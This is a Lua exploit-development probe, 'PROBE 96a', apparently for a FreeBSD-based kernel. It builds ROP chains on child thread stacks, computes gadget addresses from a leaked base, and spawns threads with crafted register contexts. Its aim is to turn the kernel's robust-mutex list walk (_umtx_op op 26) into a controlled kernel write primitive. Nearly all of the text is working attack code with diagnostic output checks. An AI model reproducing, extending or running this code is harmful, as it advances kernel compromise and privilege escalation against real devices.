-- CRASH_CLASS: MODERATE
-- PROBE 96a: UMTX_OP_ROBUST_LISTS — kernel-walks-userland-list primitive
--
-- When a thread dies holding robust mutexes, the kernel walks a
-- userland linked list and writes OWNER_DEAD (0x80000000) to each
-- mutex's m_owner field. If we control the list, we control WHERE
-- the kernel writes.
--
-- A) Test op 26 acceptance from main thread
-- B) Test thr_exit(431) for child threads
-- C) Child registers robust list → locks mutex → thr_exit → check OWNER_DEAD
-- D) Multiple list entries → multiple kernel writes

print("=== PROBE 96a: ROBUST LISTS ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local MAX_CH=20
local STK_PG=1
local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD
print(string.format("ch=%d pg=%d", MAX_CH, TOTAL_PG))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl50=R+0x20; wq(sl50,uint64(0)); wq(sl50+8,uint64(50000000))
local sl100=R+0x40; wq(sl100,uint64(0)); wq(sl100+8,uint64(100000000))
local tb=R+0x60

-- thr_exit done flag — child writes 1 here on exit
local exit_flag=R+0x80; wq(exit_flag,uint64(0))

-- ============================================================
-- A: TEST OP 26 FROM MAIN THREAD
-- ============================================================
print("--- A: OP 26 (ROBUST_LISTS) TEST ---")

-- params struct: 3 x uint64 = 24 bytes
local params=R+0x200; z(params,24)
-- All zero = no lists registered
-- val = sizeof(params) = 24

local ok_rb,rv_rb=pcall(function()
    return sc_umtx(uint64(params),uint64(26),uint64(24),uint64(0),uint64(0))
end)
print(string.format("op 26 (zero params): rv=%s",
    ok_rb and tostring(N(rv_rb)) or "PCALL-FAIL"))

-- Try with a list address pointing to our region
local LH=R+0x300   -- list head
z(LH, 0x20)
wq(LH, uint64(LH))       -- next = self (empty circular list)
wq(LH+8, uint64(0x10))   -- futex_offset = 16
wq(LH+0x10, uint64(0))   -- pending = NULL

wq(params, uint64(LH))   -- robust_list_offset = LH
wq(params+8, uint64(0))  -- robust_priv_list_offset = 0
wq(params+0x10, uint64(0)) -- robust_inact_offset = 0

local ok_rb2,rv_rb2=pcall(function()
    return sc_umtx(uint64(params),uint64(26),uint64(24),uint64(0),uint64(0))
end)
print(string.format("op 26 (with list head): rv=%s",
    ok_rb2 and tostring(N(rv_rb2)) or "PCALL-FAIL"))

local rb_works=ok_rb2 and N(rv_rb2)==0
print("op 26 works: "..tostring(rb_works))

-- ============================================================
-- B: TEST thr_exit(431) FOR CHILD THREADS
-- ============================================================
print("")
print("--- B: thr_exit(431) TEST ---")

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

-- Spawn child that immediately calls thr_exit(exit_flag)
-- thr_exit writes 1 to *state and wakes waiters
local function spawn_exiter()
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)

    -- No ROP needed — initial syscall IS thr_exit
    -- Put nanosleep as fallback in case thr_exit fails
    local off=0
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(431))          -- thr_exit
    wq(ctx+_DI,uint64(exit_flag))    -- state = &exit_flag (writes 1 on exit)

    wq(exit_flag, uint64(0))  -- clear flag
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local tid1=spawn_exiter()
local tid1_n=tid1 and N(tid1) or 0
print("child TID="..tid1_n)
native.fcall_with_rax(stub,240,sl50,0)  -- 50ms wait

local flag_val=rd(exit_flag) or 0
local c1=N(native.fcall_with_rax(stub,20))
print(string.format("exit_flag=%d canary=%d %s",
    flag_val, c1, c1==pid and "OK" or "!!CANARY"))

local thr_exit_works=(flag_val==1 and c1==pid)
print("thr_exit works: "..tostring(thr_exit_works))

if not thr_exit_works then
    print("thr_exit flag="..flag_val.." (0=not called, other=unexpected)")
    -- Try without state pointer (RDI=0)
    print("trying thr_exit(NULL)...")
    local function spawn_exiter_null()
        if cidx>=MAX_CH then return nil end
        local si=cidx; cidx=cidx+1
        local stk=child_stk(si)
        local ctx=child_ctx(si)
        local off=0
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
        z(ctx, 0x200)
        wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
        wq(ctx+_TP,uint64(0x10000))
        wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
        wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
        wq(ctx+_AX,uint64(431))
        wq(ctx+_DI,uint64(0))  -- NULL state
        wq(tb,uint64(0))
        pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
        return rq(tb)
    end
    spawn_exiter_null()
    native.fcall_with_rax(stub,240,sl50,0)
    print("canary after null exit="..N(native.fcall_with_rax(stub,20)))
end

-- ============================================================
-- C: ROBUST LIST WALK — child registers list, locks, exits
-- ============================================================
print("")
print("--- C: ROBUST LIST WALK ---")

if not rb_works then
    print("op 26 not functional — SKIP")
else

-- Layout for the robust list:
-- LH2 (list head): +0x00 next → E1, +0x08 futex_offset, +0x10 pending
-- E1 (entry 1):    +0x00 next → LH2 (circular), +0x08 pad
-- MTX1 (at E1+futex_offset): umutex struct

local LH2=R+0x400; z(LH2, 0x20)
local E1=R+0x420; z(E1, 0x30)
local FO=0x10  -- futex_offset: mutex is 16 bytes past entry start
local MTX1=E1+FO  -- = R+0x430, where m_owner lives

-- Build one-entry circular list: LH2 → E1 → LH2
wq(LH2, uint64(E1))       -- list_head.next = E1
wq(LH2+8, uint64(FO))     -- futex_offset = 16
wq(LH2+0x10, uint64(0))   -- pending = NULL
wq(E1, uint64(LH2))       -- E1.next = LH2 (back to head)
-- MTX1 at R+0x430: zeroed (m_owner=0, m_flags=0)

-- Register params pointing to LH2
local params2=R+0x460; z(params2, 24)
wq(params2, uint64(LH2))  -- robust_list = LH2
wq(params2+8, uint64(0))  -- priv = 0
wq(params2+0x10, uint64(0)) -- inact = 0

print(string.format("LH2=0x%X E1=0x%X MTX1=0x%X", LH2, E1, MTX1))
print(string.format("m_owner before: 0x%X", rd(MTX1) or 0))

-- Spawn child: register list → lock mutex → thr_exit
local function spawn_robust_exiter(params_addr, mutex_addr, exit_state_addr)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local off=0

    -- ROP after initial _umtx_op(params, 26, 24, 0, 0):
    -- Step 2: MUTEX_LOCK on the mutex
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(mutex_addr)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(5)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
    wq(stk+off,SA); off=off+8
    -- Step 3: thr_exit(exit_state_addr)
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_state_addr)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
    wq(stk+off,SA); off=off+8
    -- Fallback: nanosleep
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    -- Initial syscall: _umtx_op(params, 26, 24, 0, 0)
    wq(ctx+_AX,uint64(454))
    wq(ctx+_DI,uint64(params_addr))
    wq(ctx+_SI,uint64(26))
    wq(ctx+_DX,uint64(24))
    wq(ctx+_R10,uint64(0))
    wq(ctx+_R8,uint64(0))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- Clear exit flag and m_owner
wq(exit_flag, uint64(0))
wd(MTX1, 0)

local vm_before=vmc()
local tid_c=spawn_robust_exiter(params2, MTX1, exit_flag)
local tid_cn=tid_c and N(tid_c) or 0
print(string.format("child TID=0x%X (%d)", tid_cn, tid_cn))

-- Wait for child to execute: register list + lock + exit
native.fcall_with_rax(stub,240,sl100,0)  -- 100ms

local vm_after=vmc()
local m_owner_after=rd(MTX1) or 0
local flag_after=rd(exit_flag) or 0
local canary=N(native.fcall_with_rax(stub,20))

-- Check OWNER_DEAD: bit 31 set = 0x80000000
local owner_dead=(m_owner_after >= 0x80000000) or
    (m_owner_after < 0 and true or false)  -- handle signed

-- The raw m_owner value
local m_hi=0
if m_owner_after<0 then
    m_owner_after=m_owner_after+0x100000000
end

local tid_in_owner=m_owner_after % 0x80000000  -- strip OWNER_DEAD bit

print(string.format("m_owner after: 0x%X", m_owner_after))
print(string.format("  TID in owner: 0x%X (child was 0x%X)", tid_in_owner, tid_cn))
print(string.format("  OWNER_DEAD bit: %s", m_owner_after>=0x80000000 and "YES ***" or "no"))
print(string.format("exit_flag: %d", flag_after))
print(string.format("vmd: %d canary: %d %s", vm_after-vm_before, canary,
    canary==pid and "OK" or "!!"))

if m_owner_after>=0x80000000 and tid_in_owner==tid_cn then
    print("*** KERNEL WALKED OUR LIST! OWNER_DEAD SET! ***")
    print("*** ROBUST LIST WRITE PRIMITIVE CONFIRMED ***")
elseif m_owner_after==tid_cn and tid_cn~=0 then
    print("mutex locked (TID matches) but no OWNER_DEAD — list not walked")
    print("possible: thr_exit didn't trigger cleanup, or list format wrong")
elseif m_owner_after==0 then
    print("m_owner still 0 — lock didn't execute, or child didn't run")
else
    print(string.format("unexpected m_owner=0x%X — investigate", m_owner_after))
end

-- ============================================================
-- D: MULTIPLE ENTRIES — if C worked, test multi-entry list
-- ============================================================
if m_owner_after>=0x80000000 then
    print("")
    print("--- D: MULTI-ENTRY LIST ---")

    -- Build 4-entry circular list: LH3 → E2 → E3 → E4 → E5 → LH3
    local LH3=R+0x500; z(LH3, 0x20)
    local ENT={}; local MTX={}
    for i=1,4 do
        ENT[i]=R+0x520+(i-1)*0x30; z(ENT[i], 0x30)
        MTX[i]=ENT[i]+FO
    end

    -- Link: LH3→E2, E2→E3, E3→E4, E4→LH3
    -- Wait, it should be LH3→ENT[1], ENT[1]→ENT[2], ... ENT[4]→LH3
    wq(LH3, uint64(ENT[1]))
    wq(LH3+8, uint64(FO))
    wq(LH3+0x10, uint64(0))
    for i=1,4 do
        if i<4 then
            wq(ENT[i], uint64(ENT[i+1]))
        else
            wq(ENT[i], uint64(LH3))
        end
    end

    local params3=R+0x600; z(params3, 24)
    wq(params3, uint64(LH3))

    wq(exit_flag, uint64(0))
    for i=1,4 do wd(MTX[i], 0) end

    print(string.format("4 entries: MTX at 0x%X,0x%X,0x%X,0x%X",
        MTX[1],MTX[2],MTX[3],MTX[4]))

    -- Child: register list → lock ALL 4 mutexes → thr_exit
    local function spawn_multi_robust(paddr, mtx_list, exit_addr)
        if cidx>=MAX_CH then return nil end
        local si=cidx; cidx=cidx+1
        local stk=child_stk(si)
        local ctx=child_ctx(si)
        local off=0

        -- After initial op 26: lock each mutex, then thr_exit
        for _,ma in ipairs(mtx_list) do
            wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ma)); off=off+8
            wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(5)); off=off+8
            wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
            wq(stk+off,SA); off=off+8
        end
        -- thr_exit
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_addr)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
        wq(stk+off,SA); off=off+8
        -- nanosleep fallback
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8

        z(ctx, 0x200)
        wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
        wq(ctx+_TP,uint64(0x10000))
        wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
        wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
        wq(ctx+_AX,uint64(454))
        wq(ctx+_DI,uint64(paddr))
        wq(ctx+_SI,uint64(26))
        wq(ctx+_DX,uint64(24))
        wq(ctx+_R10,uint64(0))
        wq(ctx+_R8,uint64(0))

        wq(tb,uint64(0))
        pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
        return rq(tb)
    end

    local tid_d=spawn_multi_robust(params3, MTX, exit_flag)
    local tid_dn=tid_d and N(tid_d) or 0
    print(string.format("child TID=0x%X", tid_dn))

    native.fcall_with_rax(stub,240,sl100,0)

    local dead_count=0
    for i=1,4 do
        local mo=rd(MTX[i]) or 0
        if mo<0 then mo=mo+0x100000000 end
        local dead=mo>=0x80000000
        if dead then dead_count=dead_count+1 end
        print(string.format("  MTX[%d] m_owner=0x%X %s", i, mo,
            dead and "OWNER_DEAD" or ""))
    end
    print(string.format("OWNER_DEAD count: %d/4", dead_count))
    print(string.format("exit_flag=%d canary=%d", rd(exit_flag) or 0,
        N(native.fcall_with_rax(stub,20))))
end

end -- rb_works guard

-- ============================================================
print("")
print(string.format("ch=%d canary=%d", cidx, N(native.fcall_with_rax(stub,20))))
print("=== 96a COMPLETE ===")
